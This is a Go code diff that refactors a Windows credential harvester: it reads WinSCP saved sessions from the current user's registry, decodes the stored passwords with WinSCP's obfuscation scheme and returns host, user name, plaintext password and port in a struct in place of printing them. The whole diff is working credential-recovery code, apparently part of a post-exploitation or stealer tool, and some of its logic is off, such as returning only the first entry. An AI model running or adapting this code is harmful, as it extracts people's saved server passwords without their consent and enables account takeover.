@@ -15,56 +15,61 @@ func readSubKey(registryKey string) ([]string, error) {
 	if err != nil {
 		return keyNames, err
 	}
-
-	defer func() {
-		if err := regKey.Close(); err != nil {
-			fmt.Printf("Failed to close reg key '%v' Error: %v", regKey, err)
-		}
-	}()
 	keyNames, err = regKey.ReadSubKeyNames(0)
 	if err != nil {
-		fmt.Printf("Failed to get %q keys from registry error: %v", regKey, err)
-		return keyNames, nil
+		// fmt.Printf("Failed to get %q keys from registry error: %v", regKey, err)
+		return keyNames, err
 	}
-	// fmt.Println("Keynames: ", keyNames)
+	if err := regKey.Close(); err != nil {
+		// fmt.Printf("Failed to close reg key '%v' Error: %v", regKey, err)
+		return keyNames, err
+	}
 	return keyNames, nil
 }
-func queryValue(regKey string, value string) any {
+func queryValue(regKey string, value string) (any, error) {
 	k, err := registry.OpenKey(registry.CURRENT_USER, regKey, registry.QUERY_VALUE)
-	logErr(err)
+	if err != nil {
+		return "", err
+	}
 	defer k.Close()
 
 	sStr, _, errS := k.GetStringValue(value)
 	if errS == registry.ErrUnexpectedType {
 		sInt, _, errI := k.GetIntegerValue(value)
-		if errI == registry.ErrUnexpectedType {
-			return "unexpected key value type"
+		if errI != nil {
+			return "", errI
 		}
-		logErr(errI)
-		return sInt
+		return sInt, nil
 	}
-	logErr(errS)
-	return sStr
+	if errS != nil {
+		return "", errS
+	}
+	return sStr, nil
 }
 
-func decodeNextChar(p []string) int {
-	tmp0, err0 := strconv.Atoi(p[0])
-	logErr(err0)
-	tmp1, err1 := strconv.Atoi(p[1])
-	logErr(err1)
-	return 0xFF ^ ((((tmp0 << 4) + tmp1) ^ 0xA3) & 0xFF)
+func decodeNextChar(p []string) (int, error) {
+	tmp0, err := strconv.Atoi(p[0])
+	if err != nil {
+		return -1, err
+	}
+	tmp1, err := strconv.Atoi(p[1])
+	if err != nil {
+		return -1, err
+	}
+	return (0xFF ^ ((((tmp0 << 4) + tmp1) ^ 0xA3) & 0xFF)), nil
 }
-func decryptPass(user, pass, host any) string {
+func decryptPass(user, pass, host any) (string, error) {
 	u := user.(string)
 	p := pass.(string)
 	h := host.(string)
 	if u == "" || p == "" || h == "" {
-		return p
+		return p, nil
 	}
 	var (
 		passwd      []string
 		num, idx, k int
 		text        string
+		nErr        error
 	)
 	for _, char := range p {
 		c := fmt.Sprintf("%c", char)
@@ -85,39 +90,79 @@ func decryptPass(user, pass, host any) string {
 		passwd = append(passwd, c)
 	}
 	num = 0
-	if decodeNextChar(passwd) == 255 {
+	tmp, err := decodeNextChar(passwd)
+	if err != nil {
+		return "", err
+	}
+	if tmp == 255 {
 		num = 255
 	}
-	num = decodeNextChar(passwd[4:])
-	num2 := decodeNextChar(passwd[6:]) * 2
+	num, nErr = decodeNextChar(passwd[4:])
+	if nErr != nil {
+		return "", nErr
+	}
+	num2, err := decodeNextChar(passwd[6:])
+	num2 *= 2
+	if err != nil {
+		return "", err
+	}
 	idx = num2 + 6
 	for k = -1; k < num; k++ {
-		str := fmt.Sprintf("%c", decodeNextChar(passwd[idx:]))
+		tmp2, err := decodeNextChar(passwd[idx:])
+		if err != nil {
+			return "", err
+		}
+		str := fmt.Sprintf("%c", tmp2)
 		idx += 2
 		text += str
 	}
 	text = strings.ReplaceAll(text, u, "")
 	text = strings.ReplaceAll(text, h, "")
 	text = strings.TrimPrefix(text, "ï")
-	return text
+	return text, nil
 }
-func WinSCPCreds() {
+func WinSCPCreds() (Creds, error) {
+	cred := Creds{"UNKNOWN", "UNKNOWN", "UNKNOWN", 0}
 	registryKey := `Software\Martin Prikryl\WinSCP 2\Sessions`
 	subKeys, err := readSubKey(registryKey)
-	logErr(err)
-	var i int
+	if err != nil {
+		return cred, err
+	}
+	var (
+		i     int
+		creds []Creds
+	)
+
 	for i = 0; i < len(subKeys)-1; i++ {
 		session := registryKey + `\` + subKeys[i]
-		fmt.Printf("Session Name: %s\n", subKeys[i])
-		user := queryValue(session, "UserName")
-		pass := queryValue(session, "Password")
-		port := queryValue(session, "PortNumber")
-		host := queryValue(session, "HostName")
-		passwd := decryptPass(user, pass, host)
-		logErr(err)
-		fmt.Printf("HostName: %v\n", host)
-		fmt.Printf("UserName: %v\n", user)
-		fmt.Printf("Password: %v\n", passwd)
-		fmt.Printf("PortNumber: %v\n", port)
+		// fmt.Printf("Session Name: %s\n", subKeys[i])
+		user, err := queryValue(session, "UserName")
+		if err != nil {
+			return cred, err
+		}
+		port, err := queryValue(session, "PortNumber")
+		if err != nil {
+			return cred, err
+		}
+		host, err := queryValue(session, "HostName")
+		if err != nil {
+			return cred, err
+		}
+		pass, err := queryValue(session, "Password")
+		if err != nil {
+			return cred, err
+		}
+		passwd, err := decryptPass(user, pass, host)
+		if err != nil {
+			return cred, err
+		}
+		cred.Host = host.(string)
+		cred.Username = user.(string)
+		cred.Password = passwd
+		cred.Port = int(port.(uint64))
+		creds = append(creds, cred)
 	}
+	creds = append(creds, cred)
+	// fmt.Println(creds)
+	return creds[0], nil
 }
